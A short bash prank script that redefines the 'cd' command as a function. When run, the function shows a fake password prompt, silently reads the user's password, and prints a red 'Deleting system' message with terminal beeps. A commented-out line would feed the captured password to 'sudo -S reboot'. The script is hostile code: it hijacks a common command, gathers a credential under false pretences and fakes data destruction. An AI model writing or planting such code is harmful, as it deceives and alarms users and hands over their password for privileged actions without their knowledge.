#!/bin/bash

function cd() {
  echo -n "Password:";

  stty -echo;
  read -s password;
  stty echo;
  echo

  echo "\e[31mDeleting system................\e[0m";

  sleep 0.5
  for i in `seq 1 5`; do
    echo -ne '\007';
  done

  # Uncomment if you understand what is it
  # echo "$password" | sudo -S reboot
}

cd
